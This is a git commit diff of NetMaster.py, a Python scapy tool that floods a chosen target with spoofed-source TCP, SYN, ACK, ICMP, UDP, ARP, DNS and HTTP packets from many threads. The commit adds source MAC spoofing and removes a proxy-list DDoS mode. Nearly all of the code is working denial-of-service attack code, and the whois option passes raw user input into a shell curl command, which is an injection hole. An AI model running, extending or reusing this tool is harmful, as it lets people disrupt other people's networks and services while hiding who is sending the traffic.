eced25982046d8484af166cb55a91a726a4b3736
TheGoldenMine <86381367+TheGhostRoot@users.noreply.github.com>
2023-02-09 18:56:53 +0200

    Update NetMaster.py
    Optimized code and added MAC spoofing

--- NetMaster.py
+++ NetMaster.py
@@ -10,10 +10,11 @@ try:
     from scapy.sendrecv import send
     from scapy.packet import Raw
 except ImportError:
+    print(os.name)
     if sys.platform.startswith("win"):
         os.system("python -m pip install scapy")
-    elif sys.platform.startswith("linux") or sys.platform.startswith("termux"):
-        os.system("python3 -m pip install capy")
+    else:
+        os.system("python3 -m pip install scapy")
     try:
         from scapy.layers.dns import DNS
         from scapy.packet import Raw
@@ -25,13 +26,12 @@ except ImportError:
         print("Can't install scapy")
         exit()
 
-
 try:
     import socket
 except ImportError:
     if sys.platform.startswith("win"):
         os.system("python -m pip install sockets")
-    elif sys.platform.startswith("linux") or sys.platform.startswith("termux"):
+    else:
         os.system("python3 -m pip install sockets")
     try:
         import socket
@@ -39,13 +39,12 @@ except ImportError:
         print("Can't install socket")
         exit()
 
-
 try:
     import dns.resolver, dns.reversename
 except ImportError:
     if sys.platform.startswith("win"):
         os.system("python -m pip install dnspython")
-    elif sys.platform.startswith("linux") or sys.platform.startswith("termux"):
+    else:
         os.system("python3 -m pip install dnspython")
     try:
         import dns.resolver, dns.reversename
@@ -58,7 +57,7 @@ try:
 except ImportError:
     if sys.platform.startswith("win"):
         os.system("python -m pip install requests")
-    elif sys.platform.startswith("linux") or sys.platform.startswith("termux"):
+    else:
         os.system("python3 -m pip install requests")
     try:
         import requests
@@ -69,6 +68,7 @@ except ImportError:
 targetIP = None
 dstPort = None
 spoofIP = None
+spoofMAC = None
 threads = None
 srcPort = None
 amount = None
@@ -80,15 +80,12 @@ def setAmount():
         amount = input("{+} Amount of maximum sent packets (Optional) [Press enter for none]: ")
         if amount == "":
             break
+        elif amount.isdigit():
+            amount = int(amount)
+            break
         else:
-            isInt = False
-            try:
-                amount = int(amount)
-                isInt = True
-            except Exception:
-                print("Only numbers!")
-            if isInt:
-                break
+            print('Only numbers!')
+
 
 def setSrcPort():
     global srcPort
@@ -115,15 +112,11 @@ def setThreads():
         if threads == "":
             threads = 100
             break
+        elif threads.isdigit():
+            threads = int(threads)
+            break
         else:
-            isInt = False
-            try:
-                threads = int(threads)
-                isInt = True
-            except Exception:
-                print("Only numbers!")
-            if isInt:
-                break
+            print('Only numbers!')
 
 
 def setSpoofIP():
@@ -134,6 +127,11 @@ def setSpoofIP():
             print("This wont work the way you want to.")
         else:
             break
+
+
+def setSpoofMAC():
+    global spoofMAC
+    spoofMAC = input("{+} Spoof src MAC (Optional) [Press enter for none]: ")
 
 
 def setTargetIP():
@@ -176,17 +174,19 @@ def IPtoDNS():
 
 def attack(p):
     num = 0
+    current_thread = threading.current_thread()
     while True:
         try:
             send(p, verbose=False)
-            if num == amount:
+            if amount != "" and num == amount:
                 print("Limit reached!")
                 break
             num += 1
-            print(num)
+            print(f"{current_thread.name} 's thread have sent {num} packets.")
         except KeyboardInterrupt:
             print("CTRL+C detected. Attack stopped.")
             break
+
 
 def DoS():
     protocols = """
@@ -207,57 +207,85 @@ def DoS():
         b = input("{?} Bytes: ")
         way = input(f"[?] {targetIP} IPv4 / IPv6 (4 or 6): ")
         if mode != "" and b != "" and way != "":
-            works = False
             try:
                 mode = int(mode)
-                b = bytes(int(b))
+                b = b.encode("utf-8")
                 way = int(way)
-                works = True
-            except Exception:
+            except Exception as e:
+                print(e)
                 continue
-            if works:
+            else:
                 break
     if spoofIP == "":
         ip = requests.get('https://api.ipify.org').text
+
     else:
         ip = spoofIP
+
+    if spoofMAC != "":
+        etherPacket = Ether(src=spoofMAC)
+
+    else:
+        etherPacket = Ether()
+
+    ipPacket = IP(dst=targetIP, src=ip)
+    packetSize = Raw(load=b)
+
     if mode == 1:
-        tcp = Ether() / IP(dst=targetIP, src=ip) / TCP(dport=dstPort, sport=srcPort) / Raw(load=b)
-        for t in range(threads):
-            threading.Thread(target=attack(tcp)).start()
+        tcp = etherPacket / ipPacket / TCP(dport=dstPort, sport=srcPort) / packetSize
+        if threads is not None:
+            for t in range(threads):
+                threading.Thread(target=attack, args=[tcp]).start()
+
     elif mode == 2:
-        tcpSYN = Ether() / IP(dst=targetIP, src=ip) / TCP(dport=dstPort, sport=srcPort, flags='S') / Raw(load=b)
-        for t in range(threads):
-            threading.Thread(target=attack(tcpSYN)).start()
+        tcpSYN = etherPacket / ipPacket / TCP(dport=dstPort, sport=srcPort, flags='S') / packetSize
+        if threads is not None:
+            for t in range(threads):
+                threading.Thread(target=attack, args=[tcpSYN]).start()
+
     elif mode == 3:
-        tcpACK = Ether() / IP(dst=targetIP, src=ip) / TCP(dport=dstPort, sport=srcPort, flags='A') / Raw(load=b)
-        for t in range(threads):
-            threading.Thread(target=attack(tcpACK)).start()
+        tcpACK = etherPacket / ipPacket / TCP(dport=dstPort, sport=srcPort, flags='A') / packetSize
+        if threads is not None:
+            for t in range(threads):
+                threading.Thread(target=attack, args=[tcpACK]).start()
+
     elif mode == 4:
-        icmp = Ether() / IP(dst=targetIP, src=ip) / ICMP() / Raw(load=b)
-        for t in range(threads):
-            threading.Thread(target=attack(icmp)).start()
+        icmp = etherPacket / ipPacket / ICMP() / packetSize
+        if threads is not None:
+            for t in range(threads):
+                threading.Thread(target=attack, args=[icmp]).start()
+
     elif mode == 5:
-        udp = Ether() / IP(dst=targetIP, src=ip) / UDP(dport=dstPort, sport=srcPort) / Raw(load=b)
-        for t in range(threads):
-            threading.Thread(target=attack(udp)).start()
+        udp = etherPacket / ipPacket / UDP(dport=dstPort, sport=srcPort) / packetSize
+        if threads is not None:
+            for t in range(threads):
+                threading.Thread(target=attack, args=[udp]).start()
+
     elif mode == 6:
-        arp = Ether() / IP(dst=targetIP, src=ip) / ARP() / Raw(load=b)
-        for t in range(threads):
-            threading.Thread(target=attack(arp)).start()
+        arp = etherPacket / ipPacket / ARP() / packetSize
+        if threads is not None:
+            for t in range(threads):
+                threading.Thread(target=attack, args=[arp]).start()
+
     elif mode == 7:
-        dns = Ether() / IP(dst=targetIP, src=ip) / DNS() / Raw(load=b)
-        for t in range(threads):
-            threading.Thread(target=attack(dns)).start()
+        dns = etherPacket / ipPacket / DNS() / packetSize
+        if threads is not None:
+            for t in range(threads):
+                threading.Thread(target=attack, args=[dns]).start()
+
     elif mode == 8:
-        http = Ether() / IP(dst=targetIP, src=ip) / HTTP() / Raw(load=b)
-        for t in range(threads):
-            threading.Thread(target=attack(http)).start()
+        http = etherPacket / ipPacket / HTTP() / packetSize
+        if threads is not None:
+            for t in range(threads):
+                threading.Thread(target=attack, args=[http]).start()
+
     elif mode == 9:
         if way == 4:
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
         else:
             sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
+
         num = 0
         while True:
             try:
@@ -271,14 +299,14 @@ def DoS():
                 print("CTRL+C detected. Attack stopped.")
                 break
     elif mode == 10:
-        http = Ether() / IP(dst=targetIP, src=ip) / HTTP() / Raw(load=b)
-        dns = Ether() / IP(dst=targetIP, src=ip) / DNS() / Raw(load=b)
-        arp = Ether() / IP(dst=targetIP, src=ip) / ARP() / Raw(load=b)
-        udp = Ether() / IP(dst=targetIP, src=ip) / UDP(dport=dstPort, sport=srcPort) / Raw(load=b)
-        icmp = Ether() / IP(dst=targetIP, src=ip) / ICMP() / Raw(load=b)
-        tcpACK = Ether() / IP(dst=targetIP, src=ip) / TCP(dport=dstPort, sport=srcPort, flags='A') / Raw(load=b)
-        tcpSYN = Ether() / IP(dst=targetIP, src=ip) / TCP(dport=dstPort, sport=srcPort, flags='S') / Raw(load=b)
-        tcp = Ether() / IP(dst=targetIP, src=ip) / TCP(dport=dstPort, sport=srcPort) / Raw(load=b)
+        http = etherPacket / ipPacket / HTTP() / packetSize
+        dns = etherPacket / ipPacket / DNS() / packetSize
+        arp = etherPacket / ipPacket / ARP() / packetSize
+        udp = etherPacket / ipPacket / UDP(dport=dstPort, sport=srcPort) / packetSize
+        icmp = etherPacket / ipPacket / ICMP() / packetSize
+        tcpACK = etherPacket / ipPacket / TCP(dport=dstPort, sport=srcPort, flags='A') / packetSize
+        tcpSYN = etherPacket / ipPacket / TCP(dport=dstPort, sport=srcPort, flags='S') / packetSize
+        tcp = etherPacket / ipPacket / TCP(dport=dstPort, sport=srcPort) / packetSize
         if way == 4:
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         else:
@@ -305,146 +333,10 @@ def DoS():
                 break
 
 
-def DDoS():
-    while True:
-        fileName = input("{?} Enter the name of the file with proxies (example: text.txt or D:/folder_name/text.txt): ")
-        works = False
-        try:
-            file = open(fileName, "rt")
-            works = True
-        except Exception:
-            print("That file doesn't exist")
-        if works:
-            break
-    lines = []
-    for line in file:
-        if "\n" in line:
-            line = line.replace("\n", "")
-        lines.append(line)
-    protocols = """
-            1 - TCP
-            2 - TCP SYN
-            3 - TCP ACK
-            4 - ICMP
-            5 - UDP
-            6 - ARP
-            7 - DNS
-            8 - HTTP
-            9 - SOCKET
-            10 - All
-            """
-    print(protocols)
-    while True:
-        mode = input("{?} Protocol: ")
-        b = input("{?} Bytes: ")
-        way = input(f"[?] {targetIP} IPv4 / IPv6 (4 or 6): ")
-        if mode != "" and b != "" and way != "":
-            works = False
-            try:
-                mode = int(mode)
-                b = bytes(int(b))
-                way = int(way)
-                works = True
-            except Exception:
-                continue
-            if works:
-                break
-    if mode == 1:
-        for ip in lines:
-            tcp = Ether() / IP(dst=targetIP, src=ip) / TCP(dport=dstPort, sport=srcPort) / Raw(load=b)
-            for t in range(threads):
-                threading.Thread(target=attack(tcp)).start()
-    elif mode == 2:
-        for ip in lines:
-            tcpSYN = Ether() / IP(dst=targetIP, src=ip) / TCP(dport=dstPort, sport=srcPort, flags='S') / Raw(load=b)
-            for t in range(threads):
-                threading.Thread(target=attack(tcpSYN)).start()
-    elif mode == 3:
-        for ip in lines:
-            tcpACK = Ether() / IP(dst=targetIP, src=ip) / TCP(dport=dstPort, sport=srcPort, flags='A') / Raw(load=b)
-            for t in range(threads):
-                threading.Thread(target=attack(tcpACK)).start()
-    elif mode == 4:
-        for ip in lines:
-            icmp = Ether() / IP(dst=targetIP, src=ip) / ICMP() / Raw(load=b)
-            for t in range(threads):
-                threading.Thread(target=attack(icmp)).start()
-    elif mode == 5:
-        for ip in lines:
-            udp = Ether() / IP(dst=targetIP, src=ip) / UDP(dport=dstPort, sport=srcPort) / Raw(load=b)
-            for t in range(threads):
-                threading.Thread(target=attack(udp)).start()
-    elif mode == 6:
-        for ip in lines:
-            arp = Ether() / IP(dst=targetIP, src=ip) / ARP() / Raw(load=b)
-            for t in range(threads):
-                threading.Thread(target=attack(arp)).start()
-    elif mode == 7:
-        for ip in lines:
-            dns = Ether() / IP(dst=targetIP, src=ip) / DNS() / Raw(load=b)
-            for t in range(threads):
-                threading.Thread(target=attack(dns)).start()
-    elif mode == 8:
-        for ip in lines:
-            http = Ether() / IP(dst=targetIP, src=ip) / HTTP() / Raw(load=b)
-            for t in range(threads):
-                threading.Thread(target=attack(http)).start()
-    elif mode == 9:
-        if way == 4:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        else:
-            sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
-        num = 0
-        while True:
-            try:
-                sock.sendto(b, (targetIP, dstPort))
-                if num == amount:
-                    print("Limit reached!")
-                    break
-                num += 1
-                print(num)
-            except KeyboardInterrupt:
-                print("CTRL+C detected. Attack stopped.")
-                break
-    elif mode == 10:
-        num = 0
-        if way == 4:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        else:
-            sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
-        while True:
-            try:
-                for ip in lines:
-                    http = Ether() / IP(dst=targetIP, src=ip) / HTTP() / Raw(load=b)
-                    dns = Ether() / IP(dst=targetIP, src=ip) / DNS() / Raw(load=b)
-                    arp = Ether() / IP(dst=targetIP, src=ip) / ARP() / Raw(load=b)
-                    udp = Ether() / IP(dst=targetIP, src=ip) / UDP(dport=dstPort, sport=srcPort) / Raw(load=b)
-                    icmp = Ether() / IP(dst=targetIP, src=ip) / ICMP() / Raw(load=b)
-                    tcpACK = Ether() / IP(dst=targetIP, src=ip) / TCP(dport=dstPort, sport=srcPort,
-                                                                      flags='A') / Raw(load=b)
-                    tcpSYN = Ether() / IP(dst=targetIP, src=ip) / TCP(dport=dstPort, sport=srcPort,
-                                                                      flags='S') / Raw(load=b)
-                    tcp = Ether() / IP(dst=targetIP, src=ip) / TCP(dport=dstPort, sport=srcPort) / Raw(load=b)
-                    send(tcp, verbose=False)
-                    send(tcpSYN, verbose=False)
-                    send(tcpACK, verbose=False)
-                    send(icmp, verbose=False)
-                    send(udp, verbose=False)
-                    send(arp, verbose=False)
-                    send(dns, verbose=False)
-                    send(http, verbose=False)
-                    sock.sendto(b, (targetIP, dstPort))
-                    if num == amount:
-                        print("Limit reached!")
-                        break
-                    num += 1
-                    print(num)
-            except KeyboardInterrupt:
-                print("CTRL+C detected. Attack stopped.")
-                break
 
 setTargetIP()
 setSpoofIP()
+setSpoofMAC()
 setSrcPort()
 setDstPort()
 setThreads()
@@ -455,20 +347,21 @@ def Menu():
     menu = f"""
         target: {targetIP}
         spoofed src IP: {spoofIP}
+        spoofed src MAC: {spoofMAC}
         dst port: {dstPort}
         src port: {srcPort}
         threads: {threads}
         amount: {amount}
         
-        1 - DDoS
-        2 - DoS
-        3 - IP to Domain
-        4 - Change targetIP
-        5 - Change dst port
-        6 - Change spoof src IP
-        7 - Change threads
-        8 - Change src port
-        9 - Change amount
+        1 - DoS
+        2 - IP to Domain
+        3 - Change targetIP
+        4 - Change dst port
+        5 - Change spoof src IP
+        6 - Change threads
+        7 - Change src port
+        8 - Change amount
+        9 - Change spoof src MAC
         10 - lookup whois
         """
     print(menu)
@@ -477,38 +370,32 @@ def Menu():
 Menu()
 
 while True:
-    mode = input(" {?} What do you choose: ")
+    mode = input(" {?} What do you choose: ").lower()
     if mode == "":
         continue
-    if mode == "help":
+    if mode == "help" or mode == 'h':
         Menu()
         continue
-    working = False
-    try:
+    if mode.isdigit():
         mode = int(mode)
-        working = True
-    except Exception:
-        print("Only numbers!")
-
-    if working:
         if mode == 1:
-            DDoS()
-        elif mode == 2:
             DoS()
-        elif mode == 3:
+        elif mode == 2:
             IPtoDNS()
-        elif mode == 4:
+        elif mode == 3:
             setTargetIP()
-        elif mode == 5:
+        elif mode == 4:
             setDstPort()
-        elif mode == 6:
+        elif mode == 5:
             setSpoofIP()
-        elif mode == 7:
+        elif mode == 6:
             setThreads()
-        elif mode == 8:
+        elif mode == 7:
             setSrcPort()
-        elif mode == 9:
+        elif mode == 8:
             setAmount()
+        elif mode == 9:
+            setSpoofMAC()
         elif mode == 10:
             while True:
                 ip = input("{?} IP: ")
@@ -516,3 +403,7 @@ while True:
                     break
             print(whois(ip))
             os.system("curl https://ipwhois.app/json/" + ip)
+    else:
+        print("Only numbers")
+
+        
